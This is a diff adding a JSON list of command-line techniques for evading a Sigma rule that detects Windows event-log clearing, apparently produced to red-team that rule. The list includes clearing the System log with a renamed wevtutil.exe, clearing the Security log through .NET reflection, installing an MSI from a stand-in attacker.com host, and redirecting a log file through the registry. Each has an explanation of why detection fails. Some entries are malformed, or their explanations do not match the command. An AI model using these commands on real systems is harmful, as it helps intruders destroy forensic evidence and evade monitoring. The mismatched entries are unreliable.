@@ -1,0 +1,22 @@
+[
+  {
+    "output": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe Start-Process sl C:\\ProgramData\\DataExchange,Start",
+    "explanation": ""
+  },
+  {
+    "output": "copy C:\\Windows\\System32\\wevtutil.exe %TEMP%\\\not\\_suspicious.exe && %TEMP%\\\not\\_suspicious.exe cl System",
+    "explanation": "The rule relies on 'selection\\_wevtutil\\_img' which checks if the process image ends with '\\wevtutil.exe' or has the OriginalFileName 'wevtutil.exe'. By copying the binary to a new name, the 'Image' check is bypassed. If the EDR/SIEM does not reliably populate or check 'OriginalFileName' for renamed binaries, the command executes the 'cl' (clear-log) action undetected."
+  },
+  {
+    "output": "powershell -Command \"[System.Reflection.Assembly]::LoadWithPartialName('System.Diagnostics.Eventing.Reader'); $session = New-Object System.Diagnostics.Eventing.Reader.EventLogSession; $session.GetType().GetMethod('ClearLog').Invoke($session, @('Security', $null))\"",
+    "explanation": "The rule triggers on strings like 'ClearLog' or 'Clear-EventLog' appearing in the CommandLine. This bypass uses Reflection to invoke the ClearLog method. By breaking up the method name or using Invoke, the specific string 'ClearLog' is not present in the command line as a direct method call or parameter, avoiding the 'selection\\_other\\_ps\\_cmd' filters."
+  },
+  {
+    "output": "C:\\Windows\\System32\\msiexec.exe /i http://attacker.com/malicious.msi",
+    "explanation": "The rule contains a 'filter\\_main\\_msiexec' that excludes activity where the ParentImage is msiexec.exe and the command line contains ' sl '. An attacker can use a malicious MSI or DLL sideloading within an msiexec process to spawn 'wevtutil sl' (set-log) to set log sizes to 1KB or disable them, effectively hiding within the logic meant for legitimate Office updates."
+  },
+  {
+    "output": "reg add \"HKLM\\System\\CurrentControlSet\\Services\\EventLog\\Application\" /v \"File\" /t REG\\_EXPAND\\_SZ /d \"C:\\Windows\\Temp\\fake.evtx\" /f",
+    "explanation": "The Sigma rule focuses on process-based commands (wevtutil, powershell, wmic). It does not monitor direct Registry manipulation. By changing the 'File' value for a specific log in the registry and restarting the EventLog service (or waiting for a reboot), the system will point to a new, empty file, effectively 'clearing' the previous logs from active view without using the monitored utilities."
+  }
+]
